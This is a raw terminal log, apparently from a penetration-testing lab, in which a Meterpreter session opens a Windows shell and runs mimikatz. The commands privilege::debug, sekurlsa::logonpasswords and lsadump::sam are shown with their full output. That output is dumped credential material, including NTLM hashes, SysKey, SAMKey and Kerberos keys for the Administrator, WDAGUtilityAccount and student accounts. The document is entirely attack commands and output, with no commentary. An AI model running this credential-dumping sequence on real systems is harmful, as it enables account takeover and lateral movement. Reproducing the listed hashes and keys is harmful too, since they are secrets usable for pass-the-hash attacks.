```

```
meterpreter > shell
Process 928 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

```

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 463357 (00000000:000711fd)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/18/2023 9:25:31 AM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 461745 (00000000:00070bb1)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/18/2023 9:25:31 AM
SID               : S-1-5-96-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 149109 (00000000:00024675)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 2/18/2023 9:24:37 AM
SID               : S-1-5-21-3688751335-3073641799-161370460-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * NTLM     : e3c61a68f1b89ee6c8ba9507378dc88d
	 * SHA1     : fa62275e30d286c09d30d8fece82664eb34323ef
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 58750 (00000000:0000e57e)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/18/2023 9:24:31 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 58732 (00000000:0000e56c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/18/2023 9:24:31 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2/18/2023 9:24:30 AM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 463210 (00000000:0007116a)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/18/2023 9:25:31 AM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/18/2023 9:24:31 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 29344 (00000000:000072a0)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/18/2023 9:24:30 AM
SID               : S-1-5-96-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 29316 (00000000:00007284)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/18/2023 9:24:30 AM
SID               : S-1-5-96-0-0
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 28278 (00000000:00006e76)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/18/2023 9:24:30 AM
SID               : 
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2/18/2023 9:24:30 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

```

```
mimikatz # lsadump::sam
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ed1f5e64aad3727f03522bbddc080d77

* Primary:Kerberos-Newer-Keys *
    Default Salt : ATTACKDEFENSEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f566d48c0c62f88d997e9e56b52eed1696aead09df3100982bcfc5920655da5d
      aes128_hmac       (4096) : bf0ca9e206e82ce481c818070bef0855
      des_cbc_md5       (4096) : 6d570d08df8979fe
    OldCredentials
      aes256_hmac       (4096) : 69d101a02f3f4648bf9875f10c1cd268d3f500c3253ab862222a9e1bb3740247
      aes128_hmac       (4096) : 3c3fd899f7f004ed44e9e48f868a5ddc
      des_cbc_md5       (4096) : 9b808fb9e0cbb3b5
    OlderCredentials
      aes256_hmac       (4096) : 4cbbe8ad8482ca76952b08cd9103ba91af35c9d8b21a3d49c332e072618a9fa9
      aes128_hmac       (4096) : b18addd75f8a2b106b262c7b5e517623
      des_cbc_md5       (4096) : 7fe0c2a15eb32fcd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ATTACKDEFENSEAdministrator
    Credentials
      des_cbc_md5       : 6d570d08df8979fe
    OldCredentials
      des_cbc_md5       : 9b808fb9e0cbb3b5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b8e5edf45f3a42335f1f4906a24a08fe

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-R69684Tstudent
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bab064fdaf62216a1577f1d5cd88e162f6962b4a421d199adf4c66b61ec6ac7c
      aes128_hmac       (4096) : 42bc1d17d1236d3afc09efbeba547d2c
      des_cbc_md5       (4096) : 1a975b02a7bf15d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-R69684Tstudent
    Credentials
      des_cbc_md5       : 1a975b02a7bf15d5

```
